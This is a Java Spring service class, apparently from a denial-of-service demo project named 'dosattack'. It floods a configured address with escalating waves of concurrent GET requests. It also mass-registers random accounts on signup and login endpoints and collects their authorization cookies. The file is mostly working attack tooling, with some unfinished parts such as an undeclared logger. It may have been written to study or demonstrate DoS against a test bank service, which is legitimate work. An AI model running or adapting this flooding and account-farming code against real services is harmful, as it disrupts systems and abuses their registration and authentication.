package com.mahdiyar.dosattack.service;

import com.mahdiyar.dosattack.model.RestResponse;
import com.mahdiyar.dosattack.model.dto.request.user.LoginRequestDto;
import com.mahdiyar.dosattack.model.dto.request.user.SignupRequestDto;
import com.mahdiyar.dosattack.model.dto.response.user.LoginResponseDto;
import com.mahdiyar.dosattack.model.dto.response.user.SignupResponseDto;
import com.mahdiyar.dosattack.util.Constants;
import lombok.extern.slf4j.Slf4j;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.ParameterizedTypeReference;
import org.springframework.core.task.TaskExecutor;
import org.springframework.http.*;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.util.*;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executor;
import java.util.concurrent.FutureTask;

/**
 * @author Seyyed Mahdiyar Zerehpoush
 */
@Service
@Slf4j
public class AttackService {
    private static MessageService messageService = new MessageService();
    private static final String ATTACK_ADDRESS = Constants.ADDRESS;
    private static final String SIGNUP_URL = Constants.SIGNUP_URL;
    private static final String LOGIN_URL = Constants.LOGIN_URL;
    private static int attackersCount;
    private static ConcurrentHashMap<String, String> usernameWithToken = null;
    private Logger attackLogger = LoggerFactory.getLogger("attack-logger");
    @Autowired
    private TaskExecutor taskExecutor;
    @Autowired
    private RestTemplate restTemplate;
    private static final RestTemplate signupRestTemplate = new RestTemplate();
    private static final RestTemplate loginRestTemplate = new RestTemplate();

    private void attack(long size) {
        attackersCount++;
        List<GetRequestTask> tasks = new ArrayList<>();
        for (long i = 0; i < size; i++) {
            tasks.add(new GetRequestTask(taskExecutor));
        }
        while (!tasks.isEmpty()) {
            tasks.removeIf(GetRequestTask::isDone);
        }


    }

    public String attack(int initialSize, long maxSize, int steps) throws InterruptedException {
        attackLogger.info("##########################################################################################");
        logger.info("5s for warming up....");
        Thread.sleep(5000);
        logger.info("start attack process");
        Long startTime = System.currentTimeMillis();
        attackLogger.info("computing each step size ...");
        double stepSize = countStepSize(initialSize, maxSize, steps);
        attackLogger.info("each step size : {}", stepSize);
        long count = 0;
        int i = 1;
        while (count / maxSize < 2) {
            long l1 = System.currentTimeMillis();
            count = (long) initialSize + (int) Math.pow(stepSize, i);
            printAttackStatus(i, count);
            attack(count);
            attackLogger.info("duration : {}", System.currentTimeMillis() - l1);
            count = (long) initialSize + (int) Math.pow(stepSize, ++i);
        }
        attackLogger.info("Done!");
        attackLogger.info("##########################################################################################");
        return "Done! execution time : " + (System.currentTimeMillis() - startTime) + " ms";
    }

    private void printAttackStatus(int state, long count) {
        attackLogger.info("attack - step {} - number of api calls : {}", state, count);
        char[] arr = new char[state];
        Arrays.fill(arr, '|');
        attackLogger.info("{}", String.valueOf(arr));
    }

    private double countStepSize(int init, long max, int steps) {
        if (max - init == 0)
            return 0;
        long l = max - init;
        return (Math.log((double) l) / Math.log(steps));
    }

    public String statistics() {
        Map<String, Object> replaceMap = new HashMap<>();
        replaceMap.put("0", attackLogger);
        replaceMap.put("1", TestService.AMOUNT);
        replaceMap.put("2", TestService.INITIAL_AMOUNT - attackersCount * 1000);
        return messageService.getMessage("TEXT", replaceMap);
    }

    public Object bankAttack(int size) throws InterruptedException {
        Thread.sleep(5000);
        bulkSignupAndLogin(size);
        return null;
    }

    class GetRequestTask {
        private GetRequestWork work;
        private FutureTask<String> task;

        public GetRequestTask(Executor executor) {
            this.work = new GetRequestWork();
            this.task = new FutureTask<>(work);
            executor.execute(this.task);
        }

        public boolean isDone() {
            return this.task.isDone();
        }

        public String getResponse() {
            try {
                if (isDone())
                    return this.task.get();
                throw new Exception();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    class GetRequestWork implements Callable<String> {
        public String call() {
            try {
                return restTemplate.getForObject(ATTACK_ADDRESS, String.class);
//                logger.info("200-SUCCESS");
//                return response;
            } catch (Exception throwable) {
                attackLogger.error("connection timeout");
                throw throwable;
            }
        }
    }

    private void bulkSignupAndLogin(int count) {
        usernameWithToken = new ConcurrentHashMap<>(count);

        for (int i = 0; i < count; i++) {
            UUID uuid = UUID.randomUUID();
            try {
                ResponseEntity<RestResponse<SignupResponseDto>> signupResponse = signup(uuid.toString(), uuid.toString());
                boolean isOk = handleSignup(signupResponse);
                if (!isOk)
                    continue;
                ResponseEntity<RestResponse<LoginResponseDto>> loginResponse = login(uuid.toString(), uuid.toString());
                isOk = handleLogin(loginResponse);
                if (!isOk)
                    continue;
                usernameWithToken.put(uuid.toString(), extractAuthorizationToken(loginResponse));
            } catch (Exception ex) {
                logger.error("error in signup/login for user with username : {}", uuid.toString(), ex);
            }

        }
    }

    private String extractAuthorizationToken(ResponseEntity<RestResponse<LoginResponseDto>> loginResponse) {
        String authorizationHeader = loginResponse.getHeaders().getFirst(HttpHeaders.SET_COOKIE);
        if (authorizationHeader == null || !authorizationHeader.contains(Constants.AUTHORIZATION + "="))
            throw new IllegalStateException();
        return authorizationHeader.replace(Constants.AUTHORIZATION + "=", "");
    }

    private boolean handleLogin(ResponseEntity<RestResponse<LoginResponseDto>> loginResponse) {
        return loginResponse.getStatusCode().equals(HttpStatus.OK) && loginResponse.getBody() != null && loginResponse.getBody().getCode() == 0 && loginResponse.getBody().getContent() != null;
    }

    private ResponseEntity<RestResponse<LoginResponseDto>> login(String username, String password) {
        LoginRequestDto requestDto = new LoginRequestDto();
        requestDto.setUsername(username);
        requestDto.setPassword(password);
        HttpEntity<LoginRequestDto> requestEntity = new HttpEntity<>(requestDto);
        return loginRestTemplate
                .exchange(
                        LOGIN_URL,
                        HttpMethod.POST,
                        requestEntity,
                        new ParameterizedTypeReference<RestResponse<LoginResponseDto>>() {
                        }
                );
    }

    private boolean handleSignup(ResponseEntity<RestResponse<SignupResponseDto>> signupResponse) {
        return signupResponse.getStatusCode().equals(HttpStatus.OK) && signupResponse.getBody() != null && signupResponse.getBody().getCode() == 0 && signupResponse.getBody().getContent() != null;
    }

    private ResponseEntity<RestResponse<SignupResponseDto>> signup(String username,
                                                                   String password) {
        SignupRequestDto requestDto = new SignupRequestDto();
        requestDto.setUsername(username);
        requestDto.setPassword(password);
        HttpEntity<SignupRequestDto> requestEntity = new HttpEntity<>(requestDto);
        return signupRestTemplate
                .exchange(
                        SIGNUP_URL,
                        HttpMethod.POST,
                        requestEntity,
                        new ParameterizedTypeReference<RestResponse<SignupResponseDto>>() {
                        }
                );
    }
}
